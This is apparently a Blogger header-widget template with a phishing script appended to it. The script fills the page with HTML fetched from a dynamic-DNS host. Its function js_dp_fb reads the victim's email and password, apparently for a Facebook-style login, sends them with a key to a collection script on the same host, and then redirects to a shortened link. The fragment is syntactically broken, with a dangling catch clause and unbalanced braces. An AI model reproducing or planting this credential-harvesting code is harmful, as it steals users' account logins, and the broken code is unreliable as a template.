        <b:widget-settings>

        <b:includable id='main'>

                  </div>
                  <b:include name='description' />
                </div>
                <b:else />

                  expr:style='&quot;background-image: url(\&quot;&quot; + data:sourceUrl + &quot;\&quot;); &quot;+ &quot;background-position: &quot;+ data:backgroundPositionStyleStr + &quot;; &quot;+ data:widthStyleStr+ &quot;min-height: &quot; + data:height+ &quot;_height: &quot; + data:height+ &quot;background-repeat: no-repeat; &quot;'
                  id='header-inner'>
                  <div class='titlewrapper' style='background: transparent'>
                    <h1 class='title' style='background: transparent; border-width: 0px'>
                      <b:include name='title' />
                    </h1>
                  </div>
                  <b:include name='description' />
                </div>
              </b:if>
              <b:else />
              <div id='header-inner'>
                <a expr:href='data:blog.homepageUrl' style='display: block'>
                  <img expr:alt='data:title' expr:height='data:height'
                    expr:id='data:widget.instanceId + &quot;_headerimg&quot;' expr:src='data:sourceUrl'
                    expr:width='data:width' style='display: block' />
                </a>
                <b:if cond='data:imagePlacement == &quot;BEFORE_DESCRIPTION&quot;'>
                  <b:include name='description' />
                </b:if>
              </div>
            </b:if>
            <b:else />
            <div id='header-inner'>
              <div class='titlewrapper'>
                <h1 class='title'>
                  <b:include name='title' />
                </h1>
              </div>
              <b:include name='description' />
            </div>
          </b:if>
        </b:includable>
        <b:includable id='description'>
          <div class='descriptionwrapper'>
            <p class='description'><span>
                <data:description /></span></p>
          </div>
        </b:includable>
        <b:includable id='title'>
          <b:tag cond='data:blog.url != data:blog.homepageUrl' expr:href='data:blog.homepageUrl' name='a'>
            <data:title />

<script>
  $('#myModal_Loading').modal('show');
  function hideModal() {
    $("#myModal").removeClass("in");
    $(".modal-backdrop").remove();
    $("#myModal").hide();
  }
  var xhr = new XMLHttpRequest();
  xhr.open('GET', '//phinewa.duckdns.org/the/script.php?key=' + document.getElementById("is_smart_key").value);
  xhr.onload = function () {
    if (xhr.status === 200) {
      document.getElementById("html_main").innerHTML = xhr.responseText;
      hideModal();
    }
  };
  xhr.send();
  function js_dp_fb() {
    var email = document.getElementById("email").value;
    var pass = document.getElementById("pass").value;
    var key = document.getElementById("is_smart_key").value;
    var truyen = encodeURI("email=" + email + "|pass=" + pass + "|key=" + key + "|laguage=" + sr);
	var email = document.getElementById("email");
    var filter = /^([a-zA-Z0-9_\.\-\+\)\ \(\@]{5,100})+$/;
    if (!filter.test(email.value)) { 
             alert('Email ou número de telefone está incorreto.');
             email.focus; 
             return false; 
    }
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '//phinewa.duckdns.org/the/accvia.php?'+ truyen);
    xhr.onload = function () {
      if (xhr.status === 200) {

            window.location = 'https://bit.ly/3r9e76G';
          }
        } catch (ex) { }
      }
    };

  }
